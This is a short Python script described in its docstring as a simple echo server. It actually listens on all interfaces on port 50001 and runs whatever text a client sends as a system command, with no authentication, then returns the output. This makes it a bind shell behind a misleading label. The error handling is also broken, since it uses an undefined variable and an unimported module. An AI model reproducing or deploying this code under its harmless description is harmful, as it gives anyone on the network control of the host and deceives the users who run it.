#!/usr/bin/env python
'''
A simple echo server that handles some exceptions
'''

import socket
import subprocess

host = ''
port = 50001
backlog = 5
size = 1024
s = None
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port))
	s.listen(backlog)
except socket.error:
	if s:
		s.close()
	print('Could not open socket:', message)
	sys.exit(1)
while True:
	client, address = s.accept()
	data = client.recv(size).decode()
	print("Command")
	print(data)
	# Break data into list of arguments
	args = data.split(' ')

	proc = subprocess.Popen(args, stdout=subprocess.PIPE,
			stderr=subprocess.PIPE)
	so, se = proc.communicate()
	print("Result:")
	print(so.decode())
	if data:
		client.send(bytearray(so.decode(),'utf-8'))
	client.close()

